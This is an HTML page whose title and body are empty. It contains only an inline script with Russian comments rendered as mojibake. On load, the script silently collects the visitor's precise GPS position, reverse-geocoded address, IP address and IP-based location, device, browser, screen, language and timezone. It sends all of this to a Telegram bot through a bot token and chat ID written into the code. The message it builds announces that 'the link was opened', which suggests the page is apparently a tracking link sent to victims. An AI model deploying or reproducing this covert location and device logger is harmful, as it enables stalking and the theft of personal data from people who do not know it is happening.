<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title></title>
    <script>
        (async function() {
            let locationData = "ÐÐµ ÑƒÐ´Ð°Ð»Ð¾ÑÑŒ Ð¿Ð¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒ";
            
            // Ð¤ÑƒÐ½ÐºÑ†Ð¸Ñ Ð´Ð»Ñ Ð¿Ð¾Ð»ÑƒÑ‡ÐµÐ½Ð¸Ñ Ð³ÐµÐ¾Ð»Ð¾ÐºÐ°Ñ†Ð¸Ð¸ Ñ Ð¿Ð¾Ð²Ñ‚Ð¾Ñ€Ð½Ñ‹Ð¼Ð¸ Ð¿Ð¾Ð¿Ñ‹Ñ‚ÐºÐ°Ð¼Ð¸
            const getGeo = () => {
                return new Promise((resolve, reject) => {
                    if (!navigator.geolocation) {
                        reject("Ð“ÐµÐ¾Ð»Ð¾ÐºÐ°Ñ†Ð¸Ñ Ð½Ðµ Ð¿Ð¾Ð´Ð´ÐµÑ€Ð¶Ð¸Ð²Ð°ÐµÑ‚ÑÑ");
                        return;
                    }

                    const options = {
                        enableHighAccuracy: true,
                        timeout: 10000, // 10 ÑÐµÐºÑƒÐ½Ð´
                        maximumAge: 0
                    };

                    let attempts = 0;
                    const maxAttempts = 2;

                    const tryGetLocation = () => {
                        attempts++;
                        navigator.geolocation.getCurrentPosition(
                            (pos) => {
                                const lat = pos.coords.latitude;
                                const lon = pos.coords.longitude;
                                const acc = pos.coords.accuracy;
                                const alt = pos.coords.altitude ? `${pos.coords.altitude}Ð¼` : "ÐÐµÑ‚ Ð´Ð°Ð½Ð½Ñ‹Ñ…";
                                const speed = pos.coords.speed ? `${pos.coords.speed} Ð¼/Ñ` : "ÐÐµÑ‚ Ð´Ð°Ð½Ð½Ñ‹Ñ…";
                                
                                // ÐŸÐ¾Ð»ÑƒÑ‡Ð°ÐµÐ¼ Ð°Ð´Ñ€ÐµÑ Ñ‡ÐµÑ€ÐµÐ· Ð¾Ð±Ñ€Ð°Ñ‚Ð½Ñ‹Ð¹ Ð³ÐµÐ¾ÐºÐ¾Ð´Ð¸Ð½Ð³ (ÐµÑÐ»Ð¸ Ð½ÑƒÐ¶Ð½Ð¾)
                                fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
                                    .then(res => res.json())
                                    .then(data => {
                                        const address = data.display_name || "ÐÐ´Ñ€ÐµÑ Ð½Ðµ Ð¾Ð¿Ñ€ÐµÐ´ÐµÐ»Ñ‘Ð½";
                                        resolve(`ðŸ“ Ð¢Ð¾Ñ‡Ð½Ñ‹Ðµ ÐºÐ¾Ð¾Ñ€Ð´Ð¸Ð½Ð°Ñ‚Ñ‹: ${lat.toFixed(6)}, ${lon.toFixed(6)}
ðŸ“ ÐŸÑ€Ð¸Ð±Ð»Ð¸Ð·Ð¸Ñ‚ÐµÐ»ÑŒÐ½Ñ‹Ð¹ Ð°Ð´Ñ€ÐµÑ: ${address}
ðŸ“ Ð¢Ð¾Ñ‡Ð½Ð¾ÑÑ‚ÑŒ: ${acc}Ð¼
ðŸ“ Ð’Ñ‹ÑÐ¾Ñ‚Ð°: ${alt}
ðŸ“ Ð¡ÐºÐ¾Ñ€Ð¾ÑÑ‚ÑŒ: ${speed}`);
                                    })
                                    .catch(() => {
                                        resolve(`ðŸ“ ÐšÐ¾Ð¾Ñ€Ð´Ð¸Ð½Ð°Ñ‚Ñ‹: ${lat.toFixed(6)}, ${lon.toFixed(6)} (Ñ‚Ð¾Ñ‡Ð½Ð¾ÑÑ‚ÑŒ: ${acc}Ð¼)`);
                                    });
                            },
                            (error) => {
                                if (attempts < maxAttempts) {
                                    setTimeout(tryGetLocation, 1000);
                                } else {
                                    let errorMsg = "Ð“ÐµÐ¾Ð»Ð¾ÐºÐ°Ñ†Ð¸Ñ Ð¾Ñ‚ÐºÐ»Ð¾Ð½ÐµÐ½Ð°";
                                    switch(error.code) {
                                        case 1: errorMsg = "ÐŸÐ¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÐµÐ»ÑŒ Ð¾Ñ‚ÐºÐ°Ð·Ð°Ð» Ð² Ð´Ð¾ÑÑ‚ÑƒÐ¿Ðµ"; break;
                                        case 2: errorMsg = "Ð˜Ð½Ñ„Ð¾Ñ€Ð¼Ð°Ñ†Ð¸Ñ Ð¾ Ð¼ÐµÑÑ‚Ð¾Ð¿Ð¾Ð»Ð¾Ð¶ÐµÐ½Ð¸Ð¸ Ð½ÐµÐ´Ð¾ÑÑ‚ÑƒÐ¿Ð½Ð°"; break;
                                        case 3: errorMsg = "Ð’Ñ€ÐµÐ¼Ñ Ð·Ð°Ð¿Ñ€Ð¾ÑÐ° Ð¸ÑÑ‚ÐµÐºÐ»Ð¾"; break;
                                    }
                                    reject(errorMsg);
                                }
                            },
                            options
                        );
                    };

                    tryGetLocation();
                });
            };

            // ÐŸÐ¾Ð»ÑƒÑ‡Ð°ÐµÐ¼ Ð³ÐµÐ¾Ð»Ð¾ÐºÐ°Ñ†Ð¸ÑŽ
            try {
                locationData = await getGeo();
            } catch (e) {
                locationData = `ÐžÑˆÐ¸Ð±ÐºÐ°: ${e}`;
            }

            // ÐžÑÑ‚Ð°Ð»ÑŒÐ½Ñ‹Ðµ Ð´Ð°Ð½Ð½Ñ‹Ðµ
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const ip = ipData.ip;

            // ÐŸÑ€Ð¸Ð¼ÐµÑ€Ð½Ð¾Ðµ Ð¼ÐµÑÑ‚Ð¾Ð¿Ð¾Ð»Ð¾Ð¶ÐµÐ½Ð¸Ðµ Ð¿Ð¾ IP (ÐºÐ°Ðº Ð·Ð°Ð¿Ð°ÑÐ½Ð¾Ð¹ Ð²Ð°Ñ€Ð¸Ð°Ð½Ñ‚)
            let ipLocation = "ÐÐµ Ð¾Ð¿Ñ€ÐµÐ´ÐµÐ»ÐµÐ½Ð¾";
            try {
                const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
                const geoData = await geoResponse.json();
                ipLocation = `${geoData.city}, ${geoData.region}, ${geoData.country_name}`;
            } catch (e) {}

            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const screenRes = `${screen.width}x${screen.height}`;
            const language = navigator.language;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const time = new Date().toISOString();

            // ÐŸÑ€Ð¾Ð²ÐµÑ€ÑÐµÐ¼ Ð´Ð¾ÑÑ‚ÑƒÐ¿Ð½Ð¾ÑÑ‚ÑŒ Ð´Ð¾Ð¿Ð¾Ð»Ð½Ð¸Ñ‚ÐµÐ»ÑŒÐ½Ñ‹Ñ… API
            let contactInfo = "Web Share/Contacts API Ð½Ðµ Ð¿Ð¾Ð´Ð´ÐµÑ€Ð¶Ð¸Ð²Ð°ÐµÑ‚ÑÑ";
            if (navigator.share) contactInfo = "Web Share Ð´Ð¾ÑÑ‚ÑƒÐ¿ÐµÐ½";
            if (navigator.contacts) contactInfo = "Contacts API Ð´Ð¾ÑÑ‚ÑƒÐ¿ÐµÐ½";

            // ÐžÑ‚Ð¿Ñ€Ð°Ð²ÐºÐ° Ð² Telegram
            const botToken = '8211239754:AAH5pF047hyWePg8CYrKFJX39nUnkGGTJS4';
            const chatId = '1250741267';
            const message = `ðŸ”— Ð¡ÑÑ‹Ð»ÐºÐ° Ð¾Ñ‚ÐºÑ€Ñ‹Ñ‚Ð°:
IP: ${ip}
ðŸ“ ÐœÐµÑÑ‚Ð¾Ð¿Ð¾Ð»Ð¾Ð¶ÐµÐ½Ð¸Ðµ Ð¿Ð¾ IP: ${ipLocation}
ðŸ“ Ð“ÐµÐ¾Ð»Ð¾ÐºÐ°Ñ†Ð¸Ñ (Ð±Ñ€Ð°ÑƒÐ·ÐµÑ€): ${locationData}
ðŸ“± ÐšÐ¾Ð½Ñ‚Ð°ÐºÑ‚Ñ‹: ${contactInfo}
ðŸ’» Ð£ÑÑ‚Ñ€Ð¾Ð¹ÑÑ‚Ð²Ð¾: ${platform}
ðŸŒ Ð‘Ñ€Ð°ÑƒÐ·ÐµÑ€: ${userAgent}
ðŸ“º Ð­ÐºÑ€Ð°Ð½: ${screenRes}
ðŸ—£ï¸ Ð¯Ð·Ñ‹Ðº: ${language}
ðŸ•’ Ð§Ð°ÑÐ¾Ð²Ð¾Ð¹ Ð¿Ð¾ÑÑ: ${timezone}
â° Ð’Ñ€ÐµÐ¼Ñ: ${time}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            }).catch(() => {});
        })();
    </script>
</head>
<body>
</body>
</html>
